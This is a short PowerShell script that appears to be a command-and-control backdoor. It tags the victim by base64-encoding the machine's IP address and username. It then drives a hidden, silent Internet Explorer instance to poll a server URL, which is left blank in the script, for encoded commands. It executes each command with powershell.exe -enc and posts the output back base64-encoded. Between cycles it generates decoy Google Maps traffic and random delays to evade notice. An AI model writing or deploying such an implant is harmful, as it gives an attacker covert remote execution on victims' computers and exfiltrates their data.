$srv = ''

# define session
$e = New-Object System.Text.ASCIIEncoding
$ip = get-wmiobject Win32_NetworkAdapterConfiguration | where {$_.Ipaddress.length -gt 1}
$s = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($ip.ipaddress[0] + '|' + $env:USERNAME))

while (1) {
  $ie = new-object -com internetexplorer.application
  $ie.visible = $false
  $ie.silent = $true
  # 14 = no history, no read cache, no write cache
  $ie.navigate2($srv + '?k=' + $s, 14, 0, $null, $null)
  while ($ie.busy -eq $true) {sleep -seconds 1}
  write-host 'cmd:' $ie.document.firstchild.innertext
  # run command
  $res = powershell.exe -enc $ie.document.firstchild.innertext
  if ($res -eq $null) {
    $res = ''
  }
  $ie.navigate2($srv + '?k=' + $s, 14, 0, $e.GetBytes("d=" + [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes([String]::join("`n", $res)))), $null)
  while ($ie.busy -eq $true) {sleep -seconds 1}
  # generate traffic
  $ie.navigate('https://www.google.com/maps/')
  $delay = Get-Random -InputObject 1, 2, 3
  sleep -seconds $delay
  # cleanup
  $ie.quit()
}
